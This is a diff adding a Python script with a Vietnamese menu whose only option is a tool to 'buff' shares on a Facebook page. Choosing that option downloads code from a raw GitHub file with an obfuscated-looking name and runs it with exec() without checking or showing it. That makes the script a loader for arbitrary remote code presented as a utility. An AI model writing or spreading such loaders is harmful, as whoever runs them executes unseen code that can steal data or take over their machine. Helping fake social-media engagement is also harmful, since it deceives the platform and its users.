@@ -1,0 +1,48 @@
+import os
+import requests
+from pystyle import Colors, Colorate
+
+do = "\033[1;31m"
+
+gachngang = "─────────────────────────────────────────────────"
+colored_gachngang = Colorate.Horizontal(Colors.blue_to_green, gachngang)
+print(colored_gachngang)
+
+thanh_kp08 = "➤ "
+
+
+tienich = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃         Tool Tiện Ích        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+{thanh_kp08}Nhập [ 1.1 ] Tool Buff Share Facebook Page
+"""
+tienich = Colorate.Horizontal(Colors.blue_to_green, tienich)
+print(tienich)
+
+line = "─────────────────────────────────────────────────"
+colored_line = Colorate.Horizontal(Colors.blue_to_green, line)
+print(colored_line)
+
+chon_text = f"{thanh_kp08}Nhập Số:"
+colored_chon = Colorate.Horizontal(Colors.blue_to_green, chon_text)
+chon = input(colored_chon + " ")
+
+try:
+    # Map menu vào link raw GitHub
+    github_links = {
+        "1.1": "https://raw.githubusercontent.com/Gok36/-/refs/heads/main/%C3%A2jajjansnsnnsnensnsjskn.txt"
+        # Thêm menu khác ở đây nếu cần
+    }
+
+    if chon in github_links:
+        url = github_links[chon]
+        response = requests.get(url)
+        if response.status_code == 200:
+            exec(response.text)
+        else:
+            print(do + f"Lỗi tải code từ GitHub: {response.status_code}")
+    else:
+        print(do + f"Không có menu cho lựa chọn: {chon}")
+
+except Exception as e:
+    print(do + f"Lỗi khi thực thi code: {e}")
